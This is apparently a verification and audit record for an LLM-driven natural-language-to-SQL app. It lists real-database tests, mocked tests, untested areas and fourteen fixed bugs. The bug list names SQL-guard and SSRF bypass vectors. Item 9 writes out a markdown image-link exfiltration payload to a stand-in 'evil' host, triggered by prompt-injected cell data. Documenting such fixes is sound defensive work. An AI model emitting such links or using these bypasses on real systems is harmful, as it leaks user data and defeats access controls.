# Verification record

What was actually run, against what, and what was **not**. "Mocked" means a scripted fake LLM; it proves the
pipeline logic, not that a real model writes good SQL.

Environment: Windows 11, Python 3.12.5, Docker 29.9 (via WSL2 Ubuntu 24.04), PostgreSQL 16 (`postgres:16-alpine`),
MySQL 8.4 (`mysql:8.4`), both as throw-away containers.
Versions: langchain-core 1.7.4 · langchain-groq 1.1.3 · langchain-google-genai 4.4.2 · langchain-ollama 1.1.0 ·
langgraph 1.2.19 · SQLAlchemy 2.1.6 · DuckDB 2.0.0 · sqlglot 30.29.0 · pandas 3.1.0 · Streamlit 1.66.1 · FastAPI 0.162.0.

## Passed — against real systems

| Check | How |
|---|---|
| Real **PostgreSQL 16**: schema/PK/FK introspection, 3-way JOIN, GROUP BY/HAVING, aggregates, ORDER/LIMIT, date filters, NULLs, row cap + truncation flag | `tests/test_integration_db.py` (12 tests); revenue-by-category result compared with **pandas ground truth** from the CSVs |
| Real **MySQL 8.4**: same 12 tests | same |
| Read-only enforcement **below** the guard (guard deliberately bypassed): `DELETE/UPDATE/DROP/INSERT/CREATE` rejected by the server session; row counts unchanged | PG + MySQL |
| Server-side statement timeout cancels a runaway query; pool healthy afterwards | PG + MySQL |
| Tables/schemas outside the authorised set, system catalogs, dangerous functions rejected | PG + MySQL |
| Wrong DB password → clean error, password not echoed | PG + MySQL |
| Pool released on `close()` | PG |
| SQLite: schema/FK introspection, queries, writes impossible (`query_only`) | `tests/test_sources.py`, `test_security.py` |
| CSV, TSV (+`;` and `|` delimiters), Excel (multi-sheet, blank sheet, mixed-type column), JSON (array, lines, nested), Parquet; NULLs, empty rows/columns, duplicate/blank headers, ISO dates typed, ambiguous dates left as text, `01234` ZIPs preserved, `"1,200"` → number, Latin-1 | `tests/test_file_edge_cases.py` |
| JOIN across files and across sheets | same |
| DuckDB timeout cancels a runaway cross join (see "Bugs found" #1); external-file access blocked at engine level | same |
| **Docker image builds** (python:3.12-slim, non-root uid 1000) and 13 container checks pass: UI + API start with production commands, UI app script runs inside the container, both Docker `HEALTHCHECK`s healthy, secure defaults pinned, upload works, history persisted to the data dir | `scripts/docker_smoke.sh askql:audit` |
| Real HTTP against uvicorn with `--proxy-headers`: health, session-id enforcement, upload, bad extension, SQLite/localhost-DB blocked, 503 when no LLM | manual `curl` + smoke script |
| A **real Groq call with a deliberately invalid key** (from inside the container): the provider's real 401 is turned into a generic error (HTTP 503), and the key appears nowhere in the response or in either container's logs | `scripts/docker_smoke.sh` |

## Passed — mocked / unit (no external service)

180 tests: SQL guard (≈60 allow/deny and bypass cases), SSRF/URL policy (private/loopback/link-local/CGNAT/IPv4-mapped IPv6,
URL-parameter escapes, DNS-rebinding stand-ins), secret redaction (keys, `user:pass@`, log records, settings `repr`),
markdown-exfiltration stripping, answer-grounding, rate limiting (session/IP/global), session isolation, per-session source caps,
upload limits, history DB migration and degraded mode, API auth/CORS-independent behaviour, LLM key rotation order and
**fail-over with dead keys**, agent flow incl. self-repair loop, retry budget, privacy mode, follow-up context scoped to the
right source, LLM outage handling, headless Streamlit run.

Final local result: **204 passed, 7 skipped, 0 failed** (with PG + MySQL URLs set). Without them the 24 DB integration tests are skipped, not passed.

## NOT tested (be honest about these)

| Not tested | Why / what to do |
|---|---|
| **Any real, valid Groq / Gemini / Ollama call** — i.e. real SQL quality, real multi-key rotation under real rate limits, real Gemini/Ollama behaviour | No credentials or Ollama server here. `tests/test_integration_llm.py` exists and checks answers against pandas ground truth; run it with your keys (it is skipped otherwise — 7 skips). **Do this before announcing the demo.** |
| Real **Gemini** and **Ollama** client construction paths beyond import/instantiation | same |
| Connecting to a **remote** (public-IP) database, incl. the IP-pinning path (`hostaddr` / MySQL host rewrite) and TLS | needs a real cloud DB; the policy logic is unit-tested with a stubbed resolver only |
| MariaDB, SQL Server, Oracle; PostgreSQL < 16, MySQL < 8.4 | not run |
| Python 3.11 | CI matrix covers it; only 3.12 run locally |
| Streamlit Community Cloud, Hugging Face Spaces, Render deployments | not deployed from here; config files are provided and the Docker image they build from is verified |
| Browser-level UI behaviour (clicking, uploading via the widget, chart rendering) | only a headless `AppTest` run; no manual or browser test |
| Behind a real reverse proxy: that `X-Forwarded-For` reaches the per-IP limiter (Streamlit path) | depends on the host |
| Load / concurrency beyond unit tests; very large files (the 1M-row cap is tested, 50 MB uploads are not) | not run |
| Penetration testing | none; the security tests are regression tests for the issues known to the author |

## UI redesign (second pass)

Verified in a **real Chromium browser** (Playwright, `scripts/ui_shots.py`) against the real app with a **stand-in model**
(`scripts/ui_preview.py`): landing -> demo dataset -> question via suggestion chip -> chart/table/SQL tabs -> KPI tiles ->
Explore data -> History -> "Test connections" -> phone-width layout -> failing-models diagnostics screen. The walkthrough
reported no problems and no browser JS errors. Everything except the model is real (schema, SQL guard, DuckDB, charts,
history). This does **not** show how a real Groq/Gemini model behaves.

Browser testing found real bugs that unit tests could not: the sticky header intercepted clicks on the top tabs, the chat
input was not pinned and appeared on tabs where its answer would be invisible, numpy integers rendered without separators,
the sidebar "Success 100.0%" was truncated.

Also found from a user's real run: Google had retired the default `gemini-2.0-flash`; the default is now the
`gemini-flash-latest` alias (**not verified against the live API from here**), and failures now report per-model reasons.

## Bugs found and fixed during this audit

1. **DuckDB timeout never fired** — the timer interrupted the parent connection, but queries run on a cursor, so a cross join hung the worker (DoS). Fixed; regression test.
2. **ZIP-code/ID corruption** — `pd.read_csv` turned `01234` into `1234` before cleaning. CSVs are now read as text and types inferred explicitly.
3. **Docker: API crashed at start, UI would crash on first visit** — history DB default path not writable by the non-root user (found only by running the real container). History now defaults to `/app/data` and degrades to in-memory instead of failing.
4. **Session isolation** — a shared default session id (`anonymous`) let callers see each other's sources; random 16-64 char ids are now required.
5. **Rate limiting trivially bypassable** by rotating the client-chosen session id, and absent in the Streamlit UI. Now per-session + per-IP + global, enforced in the service (both UIs).
6. **Key fragments exposed** — UI/`/health` showed the last 4 chars of keys and model names. Removed; secrets redacted from logs/errors; settings `repr` hides them.
7. **SSRF gaps** — DNS-rebinding window, URL-parameter overrides (`host=`, `unix_socket=`, `sslrootcert=`), CGNAT, IPv4-mapped IPv6. Closed (validated IP is pinned).
8. **Guard gaps** — `query_to_xml`-style nested SQL, other-schema qualifiers, catalog-qualified names. Closed.
9. **Markdown exfiltration** via prompt-injected cell data (`![](https://evil/?d=...)`). LLM output is sanitised.
10. **Unbounded memory** — Postgres/MySQL fetched whole results client-side (now streamed), uploaded frames were held twice (now a 200-row preview), no DuckDB memory cap, `.xls` advertised without a reader (removed).
11. **API/service settings could disagree** (`create_app` read global settings) — one source of truth now.
12. "Clear conversation" in the UI did not clear follow-up context (it came from the history DB) — context now comes from the visible chat.
13. Follow-up context leaked between sources that shared a name and included failed turns — now scoped by source id, successes only.
14. Insecure defaults — `ALLOW_LOCAL_DATABASES` now defaults to `false`.
